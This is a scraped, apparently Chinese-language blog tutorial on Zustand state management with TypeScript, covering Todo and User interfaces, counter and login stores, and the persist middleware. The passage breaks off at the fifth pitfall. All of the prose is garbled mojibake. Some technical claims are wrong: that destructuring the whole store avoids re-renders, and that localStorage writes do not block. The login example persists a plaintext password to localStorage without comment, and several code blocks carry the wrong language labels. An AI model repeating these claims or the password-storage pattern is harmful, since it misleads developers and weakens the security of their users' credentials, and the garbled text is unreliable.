                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">ğŸ“– å¼•è¨€ï¼šä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦çŠ¶æ€ç®¡ç†ï¼Ÿ</h4>
<p>åœ¨ React çš„ä¸–ç•Œé‡Œï¼Œæˆ‘ä»¬ç»å¸¸é¢ä¸´ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š<strong>è·¨ç»„ä»¶é€šä¿¡</strong>ã€‚</p>
<p>å½“ä½ åœ¨ç»„ä»¶ A ä¸­ç™»å½•äº†ç”¨æˆ·ï¼Œå¦‚ä½•è®©ç»„ä»¶ Bï¼ˆæ¯”å¦‚å¯¼èˆªæ ï¼‰ç«‹åˆ»çŸ¥é“â€œç”¨æˆ·å·²ç™»å½•â€å¹¶æ˜¾ç¤ºç”¨æˆ·åï¼Ÿå¦‚æœæ•°æ®åªå­˜åœ¨ç»„ä»¶å†…éƒ¨ï¼ˆ<code>useState</code>ï¼‰ï¼Œå®ƒå°±æ˜¯â€œç§æœ‰çš„â€ã€‚æˆ‘ä»¬éœ€è¦ä¸€ä¸ª<strong>å…¨å±€å¯è®¿é—®ã€å“åº”å¼æ›´æ–°</strong>çš„â€œå…¬å…±é’±åŒ…â€ã€‚</p>
<p>è¿™å°±æ˜¯çŠ¶æ€ç®¡ç†å™¨ï¼ˆå¦‚ Redux, Zustandï¼‰çš„ç”¨æ­¦ä¹‹åœ°ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä»¥ <strong>Zustand</strong> ä¸ºæ ¸å¿ƒï¼Œç»“åˆ <strong>TypeScript</strong>ï¼Œæ·±å…¥å‰–æé‚£äº›çœ‹ä¼¼ç®€å•å´ææ˜“è¸©å‘çš„ç»†èŠ‚ã€‚</p>
<p>æˆ‘ä»¬å°†é€šè¿‡æ„å»ºä¸€ä¸ª<strong>å¾…åŠäº‹é¡¹ï¼ˆTodoï¼‰åº”ç”¨</strong>å’Œ<strong>ç”¨æˆ·ç™»å½•ç³»ç»Ÿ</strong>æ¥ä¸²è”æ‰€æœ‰çŸ¥è¯†ç‚¹ã€‚</p>
<hr/>
<h3 data-id="heading-1">ç¬¬ä¸€æ¨¡å—ï¼šåŸºçŸ³ç¯‡â€”â€”TypeScript ç±»å‹å®šä¹‰çš„è‰ºæœ¯</h3>
<p>åœ¨å¼€å§‹ç®¡ç†çŠ¶æ€ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆå®šä¹‰å¥½æ•°æ®çš„â€œå½¢çŠ¶â€ã€‚è¿™å°±åƒç›–æˆ¿å­å‰å…ˆç”»å›¾çº¸ã€‚</p>
<h4 data-id="heading-2">1.1 æ¥å£ï¼ˆInterfaceï¼‰çš„å®šä¹‰ä¸å¤ç”¨</h4>
<p>æˆ‘ä»¬é¦–å…ˆå®šä¹‰åº”ç”¨ä¸­æœ€æ ¸å¿ƒçš„ä¸¤ç§æ•°æ®ï¼š<code>Todo</code>ï¼ˆå¾…åŠäº‹é¡¹ï¼‰å’Œ <code>User</code>ï¼ˆç”¨æˆ·ï¼‰ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ª Todo çš„ç»“æ„</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>;
}

<span class="hljs-comment">// å®šä¹‰ä¸€ä¸ª User çš„ç»“æ„</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">password</span>: <span class="hljs-built_in">string</span>;
}
</code></pre>
<p><strong>ğŸ’¡ æ ¸å¿ƒè§£æï¼š</strong></p>
<ul>
<li><strong><code>interface</code></strong>ï¼šå®ƒä¸æ˜¯ç±»ï¼ˆClassï¼‰ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªâ€œå¥‘çº¦â€ã€‚å®ƒå‘Šè¯‰ç¼–è¯‘å™¨ï¼šâ€œä»»ä½•æ ‡ä¸º Todo çš„ä¸œè¥¿ï¼Œå¿…é¡»æœ‰ idï¼ˆæ•°å­—ï¼‰ã€titleï¼ˆå­—ç¬¦ä¸²ï¼‰å’Œ completedï¼ˆå¸ƒå°”å€¼ï¼‰â€ã€‚</li>
<li><strong>ç±»å‹å®‰å…¨</strong>ï¼šå¦‚æœä½ è¯•å›¾ç»™ <code>title</code> èµ‹å€¼ä¸€ä¸ªæ•°å­—ï¼ŒTypeScript ä¼šåœ¨ç¼–è¯‘é˜¶æ®µæŠ¥é”™ï¼Œè€Œä¸æ˜¯ç­‰è¿è¡Œæ—¶å´©æºƒã€‚</li>
</ul>
<h4 data-id="heading-3">1.2 çŠ¶æ€æœºæ€ç»´ï¼šå®šä¹‰ Store çš„ç»“æ„</h4>
<p>åœ¨ Zustand ä¸­ï¼ŒStore ä¸ä»…ä»…å­˜æ•°æ®ï¼Œè¿˜å­˜<strong>ä¿®æ”¹æ•°æ®çš„æ–¹æ³•</strong>ã€‚æˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ªâ€œçŠ¶æ€æœºâ€æ¥å£ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰ TodoStateï¼šåŒ…å«æ•°æ®å’Œè¡Œä¸º</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TodoState</span> {
  <span class="hljs-attr">todos</span>: <span class="hljs-title class_">Todo</span>[]; <span class="hljs-comment">// æ•°æ®ï¼šå¾…åŠäº‹é¡¹åˆ—è¡¨</span>
  <span class="hljs-attr">addTodo</span>: <span class="hljs-function">(<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>; <span class="hljs-comment">// è¡Œä¸ºï¼šæ·»åŠ æ–¹æ³•</span>
  <span class="hljs-attr">toggleTodo</span>: <span class="hljs-function">(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>; <span class="hljs-comment">// è¡Œä¸ºï¼šåˆ‡æ¢å®ŒæˆçŠ¶æ€</span>
  <span class="hljs-attr">removeTodo</span>: <span class="hljs-function">(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>; <span class="hljs-comment">// è¡Œä¸ºï¼šåˆ é™¤æ–¹æ³•</span>
}
</code></pre>
<p><strong>âš ï¸ æ˜“é”™ç‚¹ 1ï¼šå¿˜è®°å®šä¹‰å‡½æ•°ç±»å‹</strong><br/>
å¾ˆå¤šæ–°æ‰‹åªå®šä¹‰æ•°æ®ï¼ˆ<code>todos: Todo[]</code>ï¼‰ï¼Œå´å¿˜äº†å®šä¹‰å‡½æ•°ã€‚è¿™ä¼šå¯¼è‡´åœ¨ç»„ä»¶ä¸­è°ƒç”¨ <code>addTodo</code> æ—¶ï¼ŒTypeScript æç¤ºâ€œæ‰¾ä¸åˆ°è¯¥å±æ€§â€ã€‚<strong>åœ¨ Zustand ä¸­ï¼ŒState æ˜¯â€œæ•°æ®+é€»è¾‘â€çš„é›†åˆä½“ã€‚</strong></p>
<h4 data-id="heading-4">1.3 å¤æ‚çŠ¶æ€çš„é™·é˜±ï¼šåµŒå¥—ä¸å¼•ç”¨</h4>
<p>çœ‹ä¸‹é¢è¿™ä¸ª <code>UserState</code> çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserState</span> {
  <span class="hljs-attr">isLoggin</span>: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// æ‹¼å†™é”™è¯¯é™·é˜±ï¼</span>
  <span class="hljs-attr">login</span>: <span class="hljs-function">(<span class="hljs-params">user: { username: <span class="hljs-built_in">string</span>; password: <span class="hljs-built_in">string</span> }</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  <span class="hljs-attr">logout</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
  <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>; <span class="hljs-comment">// å…³é”®ç‚¹ï¼šå¯ä¸ºç©º</span>
}
</code></pre>
<p><strong>âš ï¸ æ˜“é”™ç‚¹ 2ï¼šå¯ä¸ºç©ºï¼ˆNullï¼‰çš„å¤„ç†</strong><br/>
æ³¨æ„ <code>user: User | null</code>ã€‚</p>
<ul>
<li><strong>åœºæ™¯</strong>ï¼šåº”ç”¨åˆšå¯åŠ¨æ—¶ï¼Œç”¨æˆ·è¿˜æ²¡ç™»å½•ã€‚æ­¤æ—¶ <code>user</code> æ˜¯ <code>undefined</code> æˆ– <code>null</code>ã€‚</li>
<li><strong>åæœ</strong>ï¼šå¦‚æœä½ åªå®šä¹‰ <code>user: User</code>ï¼Œé‚£ä¹ˆä½ å¿…é¡»åœ¨åˆå§‹åŒ–æ—¶æä¾›ä¸€ä¸ªå®Œæ•´çš„ User å¯¹è±¡ï¼ˆæ¯”å¦‚ <code>user: {id: 0, username: '', password: ''}</code>ï¼‰ã€‚è¿™ä¸ä»…éº»çƒ¦ï¼Œè¿˜å¯èƒ½å¯¼è‡´é€»è¾‘é”™è¯¯ï¼ˆä½ ä»¥ä¸ºç”¨æˆ·ç™»å½•äº†ï¼Œå…¶å®åªæ˜¯é»˜è®¤å€¼ï¼‰ã€‚</li>
<li><strong>æœ€ä½³å®è·µ</strong>ï¼šå¯¹äºâ€œå¯èƒ½ä¸å­˜åœ¨â€çš„æ•°æ®ï¼Œæ°¸è¿œåŠ ä¸Š <code>| null</code> æˆ– <code>| undefined</code>ã€‚</li>
</ul>
<h4 data-id="heading-5">â“ ç­”ç–‘è§£æƒ‘ç¯èŠ‚ 1</h4>
<p><strong>Q: ä¸ºä»€ä¹ˆè¦ä¸“é—¨å†™ä¸€ä¸ª <code>interface TodoState</code>ï¼Œç›´æ¥åœ¨ create é‡Œå†™ä¸è¡Œå—ï¼Ÿ</strong><br/>
A: <strong>å¯ä»¥ï¼Œä½†ä¸æ¨èã€‚</strong> åˆ†ç¦»æ¥å£ï¼ˆTypeï¼‰å’Œå®ç°ï¼ˆLogicï¼‰æ˜¯å¤§å‹é¡¹ç›®çš„æœ€ä½³å®è·µã€‚</p>
<ol>
<li><strong>å¯è¯»æ€§</strong>ï¼šçœ‹æ¥å£ä¸€çœ¼å°±çŸ¥é“è¿™ä¸ªæ¨¡å—æœ‰å“ªäº›æ•°æ®å’Œæ–¹æ³•ã€‚</li>
<li><strong>å¤ç”¨æ€§</strong>ï¼šå¦‚æœå¦ä¸€ä¸ª Store éœ€è¦å¼•ç”¨ Todo çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥ç›´æ¥ <code>extends TodoState</code>ã€‚</li>
<li><strong>ç»´æŠ¤æ€§</strong>ï¼šå½“é€»è¾‘å˜å¾—å¤æ‚æ—¶ï¼Œåˆ†ç¦»ç±»å‹èƒ½è®©ä»£ç ä¸é‚£ä¹ˆè‡ƒè‚¿ã€‚</li>
</ol>
<p><strong>Q: <code>User | null</code> å’Œ <code>User | undefined</code> æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong><br/>
A: åœ¨ JavaScript è¿è¡Œæ—¶ï¼Œ<code>null</code> å’Œ <code>undefined</code> é€šå¸¸è¢«è§†ä¸ºâ€œæ— å€¼â€ã€‚ä½†åœ¨ TypeScript è¯­ä¹‰ä¸Šï¼š</p>
<ul>
<li><code>null</code> é€šå¸¸è¡¨ç¤ºâ€œ<strong>æœ‰æ„çš„ç©ºå€¼</strong>â€ï¼ˆæ¯”å¦‚ç”¨æˆ·æ³¨é”€äº†ï¼Œæˆ‘ç‰¹æ„æŠŠ user è®¾ä¸º nullï¼‰ã€‚</li>
<li><code>undefined</code> é€šå¸¸è¡¨ç¤ºâ€œ<strong>æœªåˆå§‹åŒ–</strong>â€ã€‚<br/>
åœ¨ Zustand åˆå§‹åŒ–æ—¶ï¼Œä¸¤è€…æ•ˆæœä¸€æ ·ã€‚å»ºè®®å›¢é˜Ÿç»Ÿä¸€é£æ ¼ï¼Œé€šå¸¸æ¨èç”¨ <code>null</code> è¡¨ç¤ºâ€œæ— â€ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-6">ç¬¬äºŒæ¨¡å—ï¼šè¿›é˜¶ç¯‡â€”â€”Zustand çš„æ ¸å¿ƒæœºåˆ¶ä¸æŒä¹…åŒ–</h3>
<p>å®šä¹‰å¥½ç±»å‹åï¼Œæˆ‘ä»¬æ¥åˆ›å»º Storeã€‚Zustand çš„æ ¸å¿ƒç†å¿µæ˜¯<strong>æç®€</strong>ã€‚</p>
<h4 data-id="heading-7">2.1 åˆ›å»º Storeï¼šSet ä¸ Get çš„å“²å­¦</h4>
<p>ä»¥è®¡æ•°å™¨ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCountStore = create&lt;CounterState&gt;((<span class="hljs-keyword">set</span>) =&gt; ({
  count: <span class="hljs-number">0</span>,
  increment: () =&gt; <span class="hljs-keyword">set</span>((state) =&gt; ({ count: state.count + <span class="hljs-number">1</span> })),
  decrement: () =&gt; <span class="hljs-keyword">set</span>((state) =&gt; ({ count: state.count - <span class="hljs-number">1</span> })),
  reset: () =&gt; <span class="hljs-keyword">set</span>({ count: <span class="hljs-number">0</span> })
}))
</code></pre>
<p><strong>ğŸ’¡ æ ¸å¿ƒè§£æï¼š</strong></p>
<ul>
<li><strong><code>create&lt;CounterState&gt;</code></strong> ï¼šæ³›å‹æ³¨å…¥ï¼Œè®© IDE èƒ½è‡ªåŠ¨æç¤º <code>state.count</code>ã€‚</li>
<li><strong><code>set</code> å‡½æ•°</strong>ï¼šè¿™æ˜¯ Zustand çš„å¿ƒè„ã€‚<strong>ä½ ä¸èƒ½ç›´æ¥ä¿®æ”¹ stateï¼ˆå¦‚ <code>state.count++</code>ï¼‰ï¼Œä½ å¿…é¡»é€šè¿‡ <code>set</code> å‘Šè¯‰ Zustand â€œæˆ‘è¦ä¸€ä¸ªæ–°çš„ stateâ€</strong> ã€‚</li>
<li><strong>å‡½æ•°å¼æ›´æ–°</strong>ï¼š<code>set((state) =&gt; ...)</code>ã€‚å½“ä½ éœ€è¦åŸºäºæ—§çŠ¶æ€è®¡ç®—æ–°çŠ¶æ€æ—¶ï¼ˆå¦‚åŠ å‡ï¼‰ï¼Œå¿…é¡»ç”¨å‡½æ•°å½¢å¼ï¼Œä»¥é˜²æ­¢é—­åŒ…é™·é˜±ã€‚</li>
</ul>
<h4 data-id="heading-8">2.2 å¼‚æ­¥ä¸ä¸­é—´ä»¶ï¼šè®©æ•°æ®â€œè¿‡å¤œâ€</h4>
<p>çœ‹ä¸‹é¢çš„ç”¨æˆ·ç™»å½• Storeï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { persist } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand/middleware'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = create&lt;<span class="hljs-title class_">UserState</span>&gt;()(
  <span class="hljs-title function_">persist</span>(
    <span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> ({
      <span class="hljs-attr">isLoggin</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">login</span>: <span class="hljs-function">(<span class="hljs-params">user</span>) =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">isLoggin</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">user</span>: { ...user, <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> } }),
      <span class="hljs-attr">logout</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">isLoggin</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span> })
    }),
    { <span class="hljs-attr">name</span>: <span class="hljs-string">'user'</span> } <span class="hljs-comment">// æŒä¹…åŒ–çš„ key</span>
  )
)
</code></pre>
<p><strong>âš ï¸ æ˜“é”™ç‚¹ 3ï¼šä¸­é—´ä»¶çš„æ‰§è¡Œé¡ºåº</strong><br/>
æ³¨æ„ <code>persist</code> çš„å†™æ³•ã€‚å®ƒæ˜¯åŒ…è£¹åœ¨ <code>create</code> çš„å‚æ•°å¤–é¢çš„ã€‚</p>
<ul>
<li><strong>é€»è¾‘</strong>ï¼šZustand æ”¯æŒä¸­é—´ä»¶ï¼ˆMiddlewareï¼‰ã€‚<code>persist</code> æ˜¯ä¸€ä¸ªä¸­é—´ä»¶ï¼Œå®ƒç›‘å¬æ‰€æœ‰çš„ <code>set</code> æ“ä½œï¼Œå¹¶è‡ªåŠ¨å°†æ•°æ®å­˜å…¥ <code>localStorage</code>ã€‚</li>
<li><strong>å‘ç‚¹</strong>ï¼šå¦‚æœä¸åŠ  <code>persist</code>ï¼Œåˆ·æ–°é¡µé¢åï¼ŒStore ä¼šé‡ç½®ä¸ºåˆå§‹å€¼ï¼ˆ0 æˆ– nullï¼‰ã€‚åŠ äº† <code>persist</code> åï¼Œæ•°æ®å°±åƒé¥¼å¹²ä¸€æ ·â€œæŒä¹…â€ä¿å­˜äº†ã€‚</li>
<li><strong>é…ç½®</strong>ï¼š<code>{ name: 'user' }</code> å¯¹åº”æµè§ˆå™¨ LocalStorage é‡Œçš„ Key åå­—ã€‚</li>
</ul>
<h4 data-id="heading-9">2.3 çŠ¶æ€æ›´æ–°çš„â€œä¸å¯å˜æ€§â€ï¼ˆImmutabilityï¼‰</h4>
<p>åœ¨ <code>TodoState</code> çš„ <code>addTodo</code> ä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">addTodo</span>: <span class="hljs-function">(<span class="hljs-params">text</span>) =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({ 
  <span class="hljs-attr">todos</span>: [...state.<span class="hljs-property">todos</span>, { <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(), <span class="hljs-attr">title</span>: text, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> }] 
})),
</code></pre>
<p><strong>âš ï¸ æ˜“é”™ç‚¹ 4ï¼šç›´æ¥ä¿®æ”¹æ•°ç»„</strong><br/>
<strong>é”™è¯¯å†™æ³•</strong>ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">newTodos</span> = state.todos;
newTodos.<span class="hljs-title function_ invoke__">push</span>({<span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">title</span>: text, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span>});
<span class="hljs-title function_ invoke__">set</span>({ <span class="hljs-attr">todos</span>: newTodos }); <span class="hljs-comment">// å¤§é”™ç‰¹é”™ï¼è¿™ä¿®æ”¹äº†åŸå§‹å¼•ç”¨</span>
</code></pre>
<p><strong>åæœ</strong>ï¼šReact çš„æ›´æ–°æœºåˆ¶ä¾èµ–äºâ€œå¼•ç”¨å˜åŒ–â€ã€‚å¦‚æœä½ ç›´æ¥ <code>push</code>ï¼Œ<code>state.todos</code> çš„å†…å­˜åœ°å€æ²¡å˜ï¼ŒReact ä¼šè®¤ä¸ºæ•°æ®æ²¡å˜ï¼Œ<strong>å¯¼è‡´é¡µé¢ä¸åˆ·æ–°ï¼</strong><br/>
<strong>æ­£ç¡®åšæ³•</strong>ï¼šä½¿ç”¨æ‰©å±•è¿ç®—ç¬¦ <code>...</code> åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ã€‚</p>
<h4 data-id="heading-10">â“ ç­”ç–‘è§£æƒ‘ç¯èŠ‚ 2</h4>
<p><strong>Q: ä¸ºä»€ä¹ˆ <code>login</code> å‡½æ•°é‡Œè¦å†™ <code>{ ...user, id: 1 }</code>ï¼Ÿ</strong><br/>
A: è¿™æ˜¯ä¸ºäº†<strong>æ•°æ®å‡€åŒ–</strong>ã€‚</p>
<ol>
<li><strong>åœºæ™¯</strong>ï¼šç”¨æˆ·åœ¨ç™»å½•è¡¨å•è¾“å…¥ <code>username</code> å’Œ <code>password</code>ï¼Œè¿™äº›æ•°æ®ä¼ ç»™ <code>login</code>ã€‚</li>
<li><strong>é—®é¢˜</strong>ï¼šè¡¨å•æ•°æ®å¯èƒ½æ²¡æœ‰ <code>id</code> å­—æ®µã€‚</li>
<li><strong>è§£å†³</strong>ï¼šåœ¨å­˜å…¥ Store ä¹‹å‰ï¼Œåˆ©ç”¨å¯¹è±¡æ‰©å±•è¯­æ³•ï¼Œç»™å®ƒåŠ ä¸Šä¸€ä¸ª <code>id: 1</code>ã€‚è¿™æ ·ä¿è¯å­˜å…¥çš„ <code>user</code> ç¬¦åˆ <code>User</code> æ¥å£çš„å®šä¹‰ï¼ˆå¿…é¡»æœ‰ idï¼‰ã€‚è¿™æ˜¯ä¸€ç§é˜²å¾¡æ€§ç¼–ç¨‹ã€‚</li>
</ol>
<p><strong>Q: <code>persist</code> ä¸­é—´ä»¶ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜å—ï¼Ÿ</strong><br/>
A: åœ¨å¤§å¤šæ•°åœºæ™¯ä¸‹<strong>ä¸ä¼š</strong>ã€‚</p>
<ul>
<li><code>persist</code> é»˜è®¤æ˜¯åœ¨ <code>set</code> ä¹‹åå¼‚æ­¥å†™å…¥ LocalStorage çš„ï¼Œä¸ä¼šé˜»å¡ä¸»çº¿ç¨‹ã€‚</li>
<li><strong>æ³¨æ„</strong>ï¼šä¸è¦æŠŠå¤ªå¤§ï¼ˆMB çº§ï¼‰çš„æ•°æ®æ”¾è¿›å»ï¼ŒLocalStorage è¯»å†™è¾ƒæ…¢ï¼Œä¸”æœ‰å®¹é‡é™åˆ¶ï¼ˆé€šå¸¸ 5-10MBï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-11">ç¬¬ä¸‰æ¨¡å—ï¼šå®æˆ˜ç¯‡â€”â€”React ç»„ä»¶çš„è¿æ¥ä¸æ¸²æŸ“</h3>
<p>æœ‰äº† Storeï¼Œç°åœ¨çœ‹ç»„ä»¶å¦‚ä½•ä½¿ç”¨ã€‚</p>
<h4 data-id="heading-12">3.1 è®¢é˜…ä¸è§£æ„ï¼šæœ€å°åŒ–é‡æ¸²æŸ“</h4>
<p>çœ‹ <code>App.tsx</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 1. ä» Store ä¸­â€œå–å‡ºâ€éœ€è¦çš„å˜é‡å’Œå‡½æ•°</span>
  <span class="hljs-keyword">const</span> { count, increment, decrement, reset } = <span class="hljs-title function_">useCountStore</span>();
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"card"</span>&gt;</span>
      {/* 2. ç»‘å®šäº‹ä»¶ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{increment}</span>&gt;</span> count is {count} <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{decrement}</span>&gt;</span> -1 <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{reset}</span>&gt;</span> Reset <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<p><strong>ğŸ’¡ æ ¸å¿ƒè§£æï¼š</strong></p>
<ul>
<li><strong><code>useCountStore</code></strong>ï¼šè¿™æ˜¯ä¸€ä¸ª Hookã€‚å®ƒè®©ç»„ä»¶è®¢é˜…äº† Store çš„å˜åŒ–ã€‚</li>
<li><strong>è§£æ„èµ‹å€¼</strong>ï¼šæˆ‘ä»¬åªå–äº† <code>count</code>ã€<code>increment</code> ç­‰ã€‚Zustand æ™ºèƒ½åœ°åšåˆ°äº†**â€œé€‰æ‹©å™¨ï¼ˆSelectorï¼‰â€<strong>æœºåˆ¶ã€‚å¦‚æœ Store é‡Œè¿˜æœ‰å…¶ä»–æ•°æ®ï¼ˆæ¯”å¦‚ <code>todos</code>ï¼‰å˜äº†ï¼Œä½† <code>count</code> æ²¡å˜ï¼Œè¿™ä¸ª <code>App</code> ç»„ä»¶</strong>ä¸ä¼šé‡æ–°æ¸²æŸ“**ã€‚è¿™æ˜¯ Zustand æ¯” Redux æ€§èƒ½å¥½çš„å…³é”®ç‚¹ä¹‹ä¸€ã€‚</li>
</ul>
<h4 data-id="heading-13">3.2 äº‹ä»¶å¤„ç†ä¸çŠ¶æ€åŒæ­¥</h4>
<p><strong>âš ï¸ æ˜“é”™ç‚¹ 5ï¼šå¼‚æ­¥æ“ä½œä¸­çš„çŠ¶æ€æ»å</strong><br/>
